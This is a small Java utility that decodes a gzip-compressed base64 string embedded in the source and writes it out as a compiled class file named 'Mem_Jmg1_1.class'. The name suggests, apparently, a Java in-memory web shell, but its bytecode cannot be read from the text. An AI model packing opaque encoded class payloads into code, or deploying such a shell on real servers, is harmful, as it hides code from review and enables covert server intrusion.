package com.example.demo.Main;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;

import static com.example.demo.Static.ReflectUtil.gzipDecompress;


public class ReClass {
    public static void main(String[] args) throws Exception {
        String base64Code = "";


        String gzipBase64Code = "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";


        //byte[] classBytes = decodeBase64(base64Code);
        byte[] classBytes = gzipDecompress(decodeBase64(gzipBase64Code));

        String filePath = "Mem_Jmg1_1.class";
        saveToFile(classBytes,filePath);

        System.out.println("Class file saved to: " + filePath);
    }

    public static byte[] decodeBase64(String base64Code) {
        return Base64.getDecoder().decode(base64Code);
    }

    public static void saveToFile(byte[] classBytes, String filePath) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(filePath)) {
            fos.write(classBytes);
        }
    }
}
